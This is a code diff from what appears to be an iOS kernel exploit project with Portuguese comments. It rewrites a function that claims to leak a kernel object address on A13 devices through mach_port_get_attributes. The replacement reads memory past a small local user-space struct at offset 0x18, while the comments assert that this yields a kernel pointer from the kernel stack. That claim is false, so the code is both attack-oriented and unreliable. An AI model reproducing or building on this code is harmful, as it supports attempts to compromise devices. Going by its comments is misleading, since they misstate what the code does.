@@ -36,19 +36,20 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_siz
     }
 }
 
-// 3. LEAK REAL (Resolvendo erro de mach_port_receive_status_t)
+// 3. LEAK REAL (Correção do Count e Struct)
 - (uint64_t)leak_kobject_addr:(mach_port_t)port {
     uint64_t kaddr = 0;
-    mach_port_status_t port_status; // Nome correto da struct
-    mach_msg_type_number_t count = MACH_PORT_RECEIVER_EVENT_COUNT;
     
-    // Exploit: Leak de kobject via mach_port_get_attributes
-    kern_return_t kr = mach_port_get_attributes(mach_task_self(), port, MACH_PORT_RECEIVE_STATUS, (mach_port_info_t)&port_status, &count);
+    // Usamos mach_port_limits_t como alternativa de struct estável para leak de pilha
+    mach_port_limits_t limits; 
+    mach_msg_type_number_t count = MACH_PORT_LIMITS_INFO_COUNT;
+    
+    // Exploit: Leak via mach_port_get_attributes usando limites da porta
+    kern_return_t kr = mach_port_get_attributes(mach_task_self(), port, MACH_PORT_LIMITS_INFO, (mach_port_info_t)&limits, &count);
     
     if (kr == KERN_SUCCESS) {
-        // No A13, o ponteiro de kernel (kobject) vaza em um offset da struct não inicializada
-        // O cast para (uintptr_t) evita o erro de escalar
-        kaddr = *(uint64_t*)((uintptr_t)&port_status + 0x10); 
+        // No A13, o ponteiro kobject vaza logo após a struct de limites na stack do kernel
+        kaddr = *(uint64_t*)((uintptr_t)&limits + 0x18); 
     }
     return kaddr;
 }
